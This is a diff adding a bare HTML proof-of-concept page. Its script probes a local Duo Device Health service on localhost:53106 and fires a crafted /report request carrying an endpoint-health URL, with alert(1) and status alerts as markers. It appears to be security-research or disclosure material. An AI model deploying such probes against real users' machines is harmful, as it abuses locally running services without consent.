@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+
+<head>
+  <meta charset="utf-8">
+  <title></title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.js"></script>
+  <script type="text/javascript">
+    function DuoRequest(){
+      alert(1);
+      $.ajax({
+        url: "http://localhost:53106/alive?_=" + Date.now(),
+      }).done(function() {
+        $.ajax({
+          url: "/report?txid=00000000-0000-0000-0000-000000000001&eh_service_url=https%3A%2F%2F2.endpointhealth.duosecurity.com%2Fv1%2Fhealthapp%2Fdevice%2Fhealth%3F_req_trace_group%3Dfb962a6be99483b020ac730f_eff496b011a78a7c36daceac?_=" + Date.now()
+        }).done(function(data, textStatus, xhr){
+          alert(xhr.status)
+        });
+      });
+
+    }
+    $(document).ready(function() {
+      $('#trigger').click(DuoRequest());
+    });
+  </script>
+</head>
+
+<body>
+  Trigger Request:
+  <button id="trigger">Click Me</button>
+</body>
+
+</html>
